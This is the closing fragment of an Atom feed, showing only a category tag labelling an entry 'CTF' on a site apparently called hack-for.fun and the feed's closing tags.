    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
</feed>
